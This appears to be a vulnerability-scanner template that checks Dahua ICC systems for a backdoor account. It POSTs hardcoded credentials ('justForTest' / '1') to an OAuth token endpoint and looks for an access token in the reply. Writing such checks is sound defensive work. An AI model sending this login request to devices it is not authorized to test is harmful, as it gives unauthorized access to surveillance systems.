name: dahua-icc-backdoor-user
rules:
  - method: POST
    path: "/evo-apigw/evo-oauth/oauth/token"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "username=justForTest&password=1&grant_type=password&client_id=web_client&client_secret=web_client&public_key="
    expression: |
      response.status == 200 && response.content_type.contains("application/json") && response.body.bcontains(b"\"success\":") && response.body.bcontains(b"\"access_token\":") && response.body.bcontains(b"\"token_type\":") && response.body.bcontains(b"magicId")
